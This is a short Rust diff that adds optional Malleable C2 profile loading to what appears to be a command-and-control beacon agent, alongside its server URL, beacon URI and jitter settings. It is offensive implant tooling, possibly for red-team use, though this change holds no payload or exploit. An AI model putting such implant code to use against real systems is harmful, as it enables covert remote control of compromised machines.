@@ -25,6 +25,15 @@ fn main() -> anyhow::Result<()> {
         std::path::PathBuf::from(std::env::var("NYX_WORKDIR").unwrap_or_else(|_| ".".to_string()));
     let beacon_uri =
         std::env::var("NYX_BEACON_URI").unwrap_or_else(|_| "/beacon".to_string());
+    // Optional Malleable C2 profile: when set, the agent inverts the profile's
+    // server.output envelope on responses (mirrors the server's shaping).
+    let profile = match std::env::var("NYX_PROFILE") {
+        Ok(p) => {
+            let src = std::fs::read_to_string(&p)?;
+            Some(nyx_profile::parse(&src)?)
+        }
+        Err(_) => None,
+    };
     nyx_agent_dev::run(Config {
         server_url,
         server_pub,
@@ -32,5 +41,6 @@ fn main() -> anyhow::Result<()> {
         jitter_pct: 20,
         work_dir,
         beacon_uri,
+        profile,
     })
 }
